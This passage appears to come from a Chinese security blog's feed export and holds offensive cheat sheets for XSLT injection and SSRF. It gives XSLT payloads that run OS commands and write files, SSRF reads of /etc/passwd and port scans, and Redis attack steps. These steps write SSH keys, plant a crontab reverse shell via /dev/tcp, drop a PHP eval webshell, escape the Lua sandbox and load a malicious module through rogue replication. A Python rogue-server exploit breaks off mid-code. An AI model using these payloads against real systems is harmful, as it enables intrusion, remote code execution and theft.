&#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor($process)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty(&#x27;oname&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:jv</span>=<span class="string">&quot;http://xml.apache.org/xalan/java&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">exclude-result-prefixes</span>=<span class="string">&quot;jv&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;osversion&quot;</span> <span class="attr">select</span>=<span class="string">&quot;jv:java.lang.System.getProperty(&#x27;os.name&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$osversion&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:date</span>=<span class="string">&quot;java:java.util.Date&quot;</span> <span class="attr">xmlns:runtime</span>=<span class="string">&quot;java:java.lang.Runtime&quot;</span> <span class="attr">xmlns:process</span>=<span class="string">&quot;java:java.lang.Process&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:output</span> <span class="attr">method</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        Date: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;date:new()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;rtobject&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:getRuntime()&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;process&quot;</span> <span class="attr">select</span>=<span class="string">&quot;runtime:exec($rtobject, &#x27;sleep 5&#x27;)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;waiting&quot;</span> <span class="attr">select</span>=<span class="string">&quot;process:waitFor($process)&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$process&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 连接数据库"><a href="#XSLT 连接数据库" class="headerlink" title="XSLT 连接数据库"></a>XSLT 连接数据库</h3><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">select</span>= <span class="string">&quot;&#x27;com.mysql.jdbc.Driver&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;dbUrl&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;jdbc:mysql://localhost/xslt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltuser&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;pw&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;xsltpw&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:param</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;select test from xtable&#x27;&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;dbc&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:new($driver, $dbUrl , $user, $pw)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;table&quot;</span> <span class="attr">select</span>=<span class="string">&quot;sql:query($dbc, $query)&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;$table/*&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;sql:close($dbc)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSLT 写入文件"><a href="#XSLT 写入文件" class="headerlink" title="XSLT 写入文件"></a>XSLT 写入文件 </h3><p> 若写入成功，则无任何输出，写入失败则报错。</p><p>Saxon 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version =<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:result-document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">xsl:result-document</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Xalan-Java 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:open</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:write</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span>Hello world to local file.<span class="tag">&lt;/<span class="name">redirect:open</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">redirect:close</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>libxslt 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exsl:document</span> <span class="attr">href</span>=<span class="string">&quot;local_file.txt&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:text</span>&gt;</span>Hello World to local file.<span class="tag">&lt;/<span class="name">xsl:text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">exsl:document</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Saxon PE/Saxon EE 环境：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;local_file.txt&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:variable</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">as</span>=<span class="string">&quot;xs:string&quot;</span> <span class="attr">select</span>=<span class="string">&quot;&#x27;Hello World to local file.&#x27;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:sequence</span> <span class="attr">select</span>=<span class="string">&quot;file:append-text($file, $text)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他可以写入文件的函数有<code>file:append-text(), file:move(), file:copy(), file:delete(), file:exists(), file:is-file(), file:is-dir(), file:read(), file:write()</code></p>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF CheatSheet</title>
      <link href="/2022/04/25/SSRF-CheatSheet/"/>
      <url>/2022/04/25/SSRF-CheatSheet/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="# 简介" class="headerlink" title="简介"></a>简介</h1><p>SSRF(Server Side Request Forgery, 服务端请求伪造)，攻击者以服务器的身份发送包括内网在内的请求。</p><p>SSRF 可以：</p><ul><li>读取本地文件</li><li>内网探测</li><li>内网端口扫描</li><li>攻击内网应用</li><li>操作 Redis</li><li>反弹 shell</li></ul><p>SSRF 特征：</p><ul><li>PHP: <code>file_get_contantes</code>, <code>fsockopen</code>, <code>curl_exec</code>, <code>fopen</code>, <code>readfile</code></li><li>Python: <code>urllib</code>, <code>requests</code></li><li>Java: <code>URL</code>, <code>Request</code>, <code>HttpURLConnection</code>, <code>URLConnection</code>, <code>okhttp</code>, <code>OkHttpClient</code>, <code>HttpClients</code>, <code>Socket</code></li></ul><blockquote><p>注意：<br>PHP 需要开启 allow_url_fopen。<br>一般情况下 PHP 不会开启 fopen 的 gopher。<br>file_get_contents 的 gopher 协议不能 URL 编码。<br>file_get_contents 关于 gopher 的 302 跳转会出现 bug，导致利用失败。<br>curl/libcurl 7.43 上 gopher 协议存在 bug(%00 截断) 经测试 7.49 可用。<br>curl_exec 默认不跟踪跳转。</p></blockquote><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><p>常见语言支持协议</p><ul><li>PHP: <code>file://</code>, <code>ftp://</code>, <code>gopher://</code>, <code>http://</code>, <code>https://</code>, <code>php://</code>, <code>dict://</code>, <code>sftp://</code>, <code>ldap://</code>, <code>tftp://</code></li><li>Java: <code>file://</code>, <code>ftp://</code>, <code>http://</code>, <code>https://</code>, <code>jar://</code>, <code>netdoc://</code>, <code>mailto://</code></li><li>Python: <code>file://</code>, <code>gopher://</code>, <code>http://</code>, <code>https://</code></li></ul><h2 id="文件读取"><a href="# 文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><p>file:// 绝对路径</p><ul><li><code>file:///etc/passwd</code></li><li><code>file://c:/boot.ini</code></li></ul><blockquote><p>Java 的 file 协议可以列目录</p></blockquote><h2 id="端口扫描"><a href="# 端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>dict://ip: 端口 / 命令: 参数 1: 参数 2…</p><ul><li><code>dict://127.0.0.1:80/</code></li><li><code>dict://127.0.0.1:22/</code></li><li><code>dict://127.0.0.1:6379/</code></li></ul><h2 id="读取压缩包内容"><a href="# 读取压缩包内容" class="headerlink" title="读取压缩包内容"></a>读取压缩包内容 </h2><p>Java 特有<code>jar://</code> 协议，可以用来读取 jar 包或 zip 等压缩文件内容。利用 jar 协议也可以绕过协议前缀限制读取压缩文件内容。</p><ul><li><code>jar://http://foo.com/bar.jar!/</code> 读取 jar 包。</li><li><code>jar://http://foo.com/bar.jar!/COM/foo/a.class</code> 读取其中某个资源文件。</li><li><code>jar://http://foo.com/bar.jar!/COM/foo/</code> 读取一个目录。</li></ul><h2 id="Redis 未授权访问"><a href="#Redis 未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问 </h2><p>Redis 在没有开启<code>protected-mode</code> 并且没有主动绑定 ip 的情况下存在未授权访问漏洞。利用 SSRF 扫描端口 <code>dict://127.0.0.1:6379/info</code> 或者 <code>dict://0.0.0.0:6379/info</code> 查看是否开启 redis 服务。</p><p>Redis 常用命令：</p><ul><li><code>info</code> 查看 redis 版本信息</li><li><code>flushall</code> 清空所有数据</li><li><code>config set dir PATH</code> 设置保存备份的目录，绝对路径</li><li><code>config set dbfilename</code> 设置保存备份的文件名</li><li><code>set key value</code> 向 redis 中添加一个键值对</li><li><code>keys</code> 查看所有的键</li><li><code>get key</code> 获取一个键的值</li><li><code>del key</code> 删除一个键值对</li><li><code>save</code> 保存所有数据到 config 设置的备份文件中</li></ul><p>通过 dict 或者 gophar 协议发送命令操作 Redis 数据库，例如<code>dict://0.0.0.0:6379/info</code>，带多个参数的命令例如<code>dict://0.0.0.0:6379/config:set:dir:/etc/</code>。dict 和 gophar 的区别是：多个命令 dict 需要多次发送，而 gophar 可以一次性发送。</p><h3 id="Redis 任意数据访问与修改"><a href="#Redis 任意数据访问与修改" class="headerlink" title="Redis 任意数据访问与修改"></a>Redis 任意数据访问与修改</h3><ul><li>清空数据 <code>flushall</code></li><li>删除数据 <code>del key</code></li><li>查看所有的数据的键 <code>keys</code></li><li>查看数据 <code>get key</code></li><li>写入新数据 <code>set key value</code></li></ul><h3 id="任意文件写"><a href="# 任意文件写" class="headerlink" title="任意文件写"></a>任意文件写</h3><ol><li>写入一个新数据 <code>set x &quot;value&quot;</code></li><li>Redis 设置备份目录 <code>config set dir /dir/name/</code></li><li>Redis 设置备份文件名为 <code>config set dbfilename filename</code></li><li>保存 redis 中所有数据到备份文件中，实现写文件 <code>save</code></li></ol><h3 id="写入 ssh 公钥"><a href="# 写入 ssh 公钥" class="headerlink" title="写入 ssh 公钥"></a>写入 ssh 公钥 </h3><p> 写入公钥以后通过 ssh 私钥登录。有 root 权限可以写 root 公钥，无 root 权限需要知道用户目录。</p><ol><li>生成 ssh 密钥对 <code>$ ssh-keygen -t rsa</code></li><li>查看公钥 <code>$ cat ~/.ssh/id_rsa.pub</code></li><li>Redis 设置备份目录为 ssh 目录 <code>config set dir /root/.ssh/</code></li><li>Redis 设置备份文件名为 authorized_keys <code>config set dbfilename authorized_keys</code></li><li>（可选）清空 redis 中的已有数据 <code>flushall</code></li><li>写入一个新数据，值为刚才 cat 的 ssh 公钥 <code>set x &quot;\n\n\nssh-rsa AAAAB3...zrrSPrs= root@kali\n\n\n&quot;</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li><li>连接 ssh <code>$ ssh -i ~/.ssh/id_rsa root@ip</code></li></ol><h3 id="反弹 shell"><a href="# 反弹 shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>利用 crontab 定时任务执行命令反弹 shell。</p><ol><li>（可选）清空数据 <code>flushall</code></li><li>写入一个新数据，值为 crontab 格式的 bash 反弹 shell 命令 <code>set x &quot;\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\n\n&quot;</code></li><li>Redis 设置备份目录为 etc 目录 <code>config set dir /etc/</code></li><li>Redis 设置备份文件名为 crontab <code>config set dbfilename crontab</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li><li>监听反弹 shell 端口 <code>nc -lvp port</code></li></ol><blockquote><p>Centos 的定时任务文件在 /var/spool/cron/&lt;username&gt;，Ubuntu 定时任务文件在 /var/spool/cron/crontabs/&lt;username&gt;，二者共有定时任务文件在 /etc/crontab。<br>注意：Ubuntu 下无法实现 crontab 反弹 shell。Redis 以 root 身份写的文件权限为 644，普通用户则是 664，但 Ubuntu 要求在 /var/spool/cron/crontabs/ 中执行定时任务的文件权限必须是 600，而如果写入 /etc/crontab，由于存在乱码，因此 ubuntu 不能正确执行定时任务；而 CentOS 在 /var/spool/cron/ 中的定时任务文件权限为 644 就能执行</p></blockquote><h3 id="写 webshell"><a href="# 写 webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><ol><li>写入一个新数据，值为 webshell <code>set x &quot;&lt;?php eval($_GET[&#39;a&#39;]);?&gt;&quot;</code></li><li>Redis 设置备份目录为 web 目录 <code>config set dir /var/www/html/</code></li><li>Redis 设置备份文件名为 webshell 的名字 <code>config set dbfilename shell.php</code></li><li>保存 redis 中所有数据到备份文件中 <code>save</code></li></ol><h3 id="执行 Lua"><a href="# 执行 Lua" class="headerlink" title="执行 Lua"></a>执行 Lua</h3><p>Redis 可以直接执行 lua 代码，但是限制在沙箱中，利用 <code>eval &quot;lua 代码 &quot;</code> 执行。</p><p><code>dofile</code>函数可以执行一个 lua 文件，但是执行失败后也会返回一些信息。</p><ol><li>检查文件是否存在或者是否有权限<ul><li><code>eval &quot;reutrn dofile(&#39;/etc/passwd&#39;)&quot;</code>。</li></ul></li><li>获取文件部分信息。<ul><li><code>eval &quot;return dofile(&#39;/etc/issue&#39;)&quot;</code></li><li><code>eval &quot;return dofile(&#39;/etc/lsb-release&#39;)&quot;</code></li><li><code>eval &quot;return dofile(&#39;/etc/hosts&#39;)&quot;</code></li><li><code>eval &quot;dofile(&#39;/etc/environment&#39;);return(PATH);</code></li><li><code>eval &quot;dofile(&#39;/home/ubuntu/.selected_editor&#39;);return(SELECTED_EDITOR);</code></li></ul></li></ol><p>利用 lua 甚至可以 rce。</p><blockquote><p>注意：适用于以下版本<br>2.2 &lt;= redis &lt; 5.0.13<br>2.2 &lt;= redis &lt; 6.0.15<br>2.2 &lt;= redis &lt; 6.2.5</p></blockquote><p><code>eval &#39;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;ls -al&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#39;</code></p><blockquote><p>注意：不同系统下 liblua5.1.so.0 的路径可能不同</p></blockquote><h3 id="主从复制"><a href="# 主从复制" class="headerlink" title="主从复制"></a>主从复制 </h3><p> 主从模式是 Redis 提供的一种分布式模式：使用一台 Redis 服务器作为主机，其他多台 Rediis 服务器作为从机，主机与从机数据相同，但是主机只负责写，从机只负责读，通过 <code>fullresync</code> 命令可以实现主从机之间的数据同步。</p><blockquote><p>通过 <code>info replication</code> 命令可以查看当前 Redis 服务器是主机还是从机。<br>通过 <code>slaveof &lt;masterip&gt; &lt;masterport&gt;</code> 可以设置当前主机为从机。</p></blockquote><p>在 Reids 4.x 之后，可以通过 Redis 外部拓展 <code>.so</code> 文件，在 Redis 中添加一个新的 Redis 命令，实现代码执行。项目 <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a> 实现了一个可以执行命令的 Redis 扩展，扩展加载完毕后通过 <code>system.exec command</code> 就可以执行命令，使用 <code>system.rev ip port</code> 就可以把命令执行结果返回到指定地址。</p><p>攻击步骤如下，假设目标 Redis 服务器位于 <code>1.1.1.1:6379</code>，攻击者模拟的 Redis 服务器位于 <code>2.2.2.2:6386</code>。</p><ol><li>首先设置目标服务器，使其认作攻击者服务器为主服务器：<code>slaveof 2.2.2.2 6386</code>。</li><li>设置 <code>dbfilename</code> 为从服务器要保存恶意 <code>.so</code> 文件的文件名：<code>config set dbfilename exp.so</code>。</li><li>这时目标服务器，也就是从服务器会返回 <code>PING</code> 命令确认主机存活，攻击者服务器，也就是主服务器需要返回：<code>+PANG</code>。</li><li>从服务器会接着返回多个以 <code>REPLCONF</code> 开头的命令，类似 <code>REPLCONF ...</code> 来确认服务器信息，主服务器都需要返回：<code>+OK</code>。</li><li>当从服务器返回 <code>PSYNC</code> 或者 <code>SYNC</code> 命令时，代表从服务器请求同步数据，这时主服务器需要返回：<code>+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\npayload</code>，其中 <code>payload</code> 就是恶意 <code>.so</code> 文件的内容。</li><li>同步完成后，恶意 <code>.so</code> 的内容就会被保存到从服务器的 <code>exp.so</code> 文件中，命令从服务器读取该模块：<code>module load exp.so</code>。</li><li>然后断开主从链接：<code>slaveof no one</code>。</li><li>最后就可以向从服务器发送恶意 <code>.so</code> 文件中的命令。</li></ol><p>上述步骤十分繁琐，而且还需要实现模拟主服务器的程序，已经有人准备好了 exp，需要配合 <code>RedisModules-ExecuteCommand</code>使用，如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;&gt;&gt; %(message)s&#x27;</span>)</span><br><span class="line">DELIMITER = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;*&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.strip().split(DELIMITER)[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> data.startswith(<span class="string">b&#x27;$&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> data.split(DELIMITER, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data.strip().split()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span 